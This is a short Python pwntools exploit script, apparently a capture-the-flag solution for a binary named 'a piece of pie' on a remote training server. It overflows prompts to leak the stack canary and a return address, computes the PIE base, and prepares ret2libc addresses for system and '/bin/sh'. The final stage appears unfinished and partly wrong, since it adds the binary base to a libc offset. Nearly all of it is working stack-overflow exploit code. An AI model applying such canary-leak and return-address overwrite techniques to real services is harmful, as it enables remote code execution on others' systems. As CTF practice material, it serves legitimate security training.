from pwn import *

port =  14676
rem = remote("srv1.kitriwhs.kr", port)


# rem = process(["./a piece of pie"])
# rem.interactive()

puts_offset = 0x80e50
puts_plt = 0x10b0
puts_got = 0x3fa0

elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
base_to_gadget = elf.symbols["gadget"]
base_to_main = elf.symbols["main"]
base_to_vuln = elf.symbols["vuln"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]


gadget = 0x126e
main = 0x13db

libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
system = libc.symbols["system"]
print(hex(system))

payload = b"A" * 0x1
rem.sendafter(b"name: ", payload)

payload = b"A" * 0xa9
rem.sendafter(b"1: ", payload)
rem.recvuntil(payload)
recv = rem.recvline().rstrip()
canary = p64(int(recv[0:7].hex(), 16), endian="big")
print(canary)


payload = b"B" * 0xb8
rem.sendafter(b"2: ", payload)
rem.recvuntil(payload)
recv = rem.recvline().rstrip()
ret_addr = int(recv[0:7][::-1].hex(), 16)
base_addr = ret_addr - 125 - main
print(base_addr)
print(hex(base_addr))

gadget_addr = base_addr + gadget
print(gadget_addr)
print(hex(gadget_addr))

system_addr = base_addr + system
shell_addr = base_addr + next(libc.search("/bin/sh"))
vuln_addr = base_addr + base_to_vuln

payload = b"C" * 0xa8 + canary + b"D" * 0x8 + p64(vuln_addr)
rem.sendafter(b"3: ", payload)

# rem.interactive()
